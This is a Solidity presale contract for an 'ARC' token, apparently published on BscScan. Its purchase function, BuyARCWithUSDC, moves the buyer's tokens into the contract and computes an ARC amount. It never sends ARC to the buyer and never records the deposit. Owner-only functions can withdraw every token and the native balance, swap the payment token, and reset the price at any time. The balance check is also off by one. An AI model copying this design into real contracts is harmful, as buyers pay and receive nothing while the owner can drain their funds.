/**
 *Submitted for verification at BscScan.com on 2023-02-13
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


contract Context {

    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}


interface IARC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) 
    
    {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor ()  {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}


contract ARC_Presale is Ownable {
    using SafeMath for uint256;

    IARC20 public token;
    uint256 public ARCpricePerToken = 8333000000000000000000; // 8333 ARC per USDC
    bool public presaleStatus;

    mapping(address => uint256) public deposits;
    event Deposited(address indexed user, uint256 amount);
    event Recovered(address token, uint256 amount);

    constructor(IARC20 _token)  {
        token = _token;
        presaleStatus = true;
    }

 
    
    function balanceOf(address account) public view returns (uint256) {
        return token.balanceOf(account);
    }

    function BuyARCWithUSDC(uint256 _tokenAmount) public returns(address,uint256)
    {
        require(presaleStatus == true, "Presale : Presale is finished");
        require(_tokenAmount > 0, "Presale : Unsuitable Amount");
        require(token.balanceOf(msg.sender)>_tokenAmount,"not enough token in your wallet");
        token.transferFrom(msg.sender, address(this), _tokenAmount);
        uint256 tokenAmount = getARCvalue(_tokenAmount);  
        return (msg.sender,tokenAmount);
  
    }


    function getARCvalue(uint256 value) public view returns(uint256)
    {
        return (ARCpricePerToken*value)/1e18;
    }


      receive() external payable {
            // React to receiving ARC
        }


    function contractbalance() public view returns(uint256)
    {
      return address(this).balance;
    }

    function recoverARC20(address tokenAddress, uint256 tokenAmount) external onlyOwner {
        IARC20(tokenAddress).transfer(this.owner(), tokenAmount);
        emit Recovered(tokenAddress, tokenAmount);
    }
       function releaseFunds() external onlyOwner 
    {
        payable(msg.sender).transfer(address(this).balance);
    }
    
    function setRewardARCPricepertoken(uint256 _count) external onlyOwner {
        ARCpricePerToken = _count;
    }

    function changeToken(IARC20 _token) external onlyOwner{
        token=_token;
    }

    function stopPresale() external onlyOwner {
        presaleStatus = false;
    }

    function resumePresale() external onlyOwner {
        presaleStatus = true;
    }

    // USDC 0x78867BbEeF44f2326bF8DDd1941a4439382EF2A7
    
  
}